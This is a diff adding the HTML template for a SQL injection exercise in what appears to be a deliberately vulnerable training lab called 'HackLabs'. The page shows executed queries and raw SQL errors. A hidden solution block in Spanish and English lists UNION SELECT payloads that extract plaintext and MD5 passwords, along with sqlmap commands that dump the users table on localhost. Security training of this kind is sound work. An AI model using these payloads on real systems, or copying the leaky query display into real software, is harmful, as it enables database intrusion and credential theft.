@@ -1,0 +1,84 @@
+{% extends "base.html" %}
+{% block title %}SQL Injection – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <form method="GET" action="/sqli/search" class="flex gap-3 items-end">
+      <div class="flex-1">
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Search products</label>
+        <input type="text" name="q" value="{{ query | e }}" placeholder="Search..." class="hl-input font-mono" />
+      </div>
+      <button type="submit" class="btn-primary flex-shrink-0">Search</button>
+    </form>
+  </div>
+
+  {% if executed_query %}
+  <div class="hl-code mb-3 text-xs text-gray-500 dark:text-gray-500">
+    <span class="text-gray-400">Query:</span> <span class="text-yellow-500">{{ executed_query }}</span>
+  </div>
+  {% endif %}
+  {% if sql_error %}
+  <div class="alert-error mb-4 font-mono text-xs">{{ sql_error }}</div>
+  {% endif %}
+  {% if results %}
+  <div class="hl-card mb-4 overflow-x-auto">
+    <div class="text-xs text-gray-400 mb-3">{{ results | length }} result(s)</div>
+    <table class="hl-table">
+      <thead><tr>{% for col in results[0].keys() %}<th>{{ col }}</th>{% endfor %}</tr></thead>
+      <tbody>
+        {% for row in results %}
+        <tr>{% for val in row %}<td>{{ val }}</td>{% endfor %}</tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </div>
+  {% elif query and not sql_error %}
+  <div class="hl-card mb-4 text-sm text-gray-400">No results for "{{ query | e }}"</div>
+  {% endif %}
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Pasos de explotación</h3>
+    <ol>
+      <li>Prueba el payload básico: <code>' OR '1'='1</code> para obtener todos los registros.</li>
+      <li>Prueba un UNION para extraer la tabla de usuarios:</li>
+    </ol>
+    <pre>' UNION SELECT 1,username,password_plain,4,5 FROM users--</pre>
+    <ol start="3">
+      <li>Prueba extracción de hashes: <code>' UNION SELECT 1,username,password_md5,4,5 FROM users--</code></li>
+      <li>Usa sqlmap para automatizar la explotación completa:</li>
+    </ol>
+    <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --dbs --batch
+sqlmap -u "http://localhost:5000/sqli/search?q=test" -D main --tables --batch
+sqlmap -u "http://localhost:5000/sqli/search?q=test" -D main -T users --dump --batch</pre>
+    <ol start="5">
+      <li>Con Burp Suite: intercepta el GET, envía al Repeater y modifica el parámetro <code>q</code>.</li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">manual</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Exploitation Steps</h3>
+    <ol>
+      <li>Try the basic payload: <code>' OR '1'='1</code> to retrieve all records.</li>
+      <li>Try a UNION to dump the users table:</li>
+    </ol>
+    <pre>' UNION SELECT 1,username,password_plain,4,5 FROM users--</pre>
+    <ol start="3">
+      <li>Extract hashes: <code>' UNION SELECT 1,username,password_md5,4,5 FROM users--</code></li>
+      <li>Use sqlmap to fully automate exploitation:</li>
+    </ol>
+    <pre>sqlmap -u "http://localhost:5000/sqli/search?q=test" --dbs --batch
+sqlmap -u "http://localhost:5000/sqli/search?q=test" -D main --tables --batch
+sqlmap -u "http://localhost:5000/sqli/search?q=test" -D main -T users --dump --batch</pre>
+    <ol start="5">
+      <li>With Burp Suite: intercept the GET request, send to Repeater and modify the <code>q</code> parameter.</li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">sqlmap</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">manual</span></div>
+  </div>
+</div>
+{% endblock %}
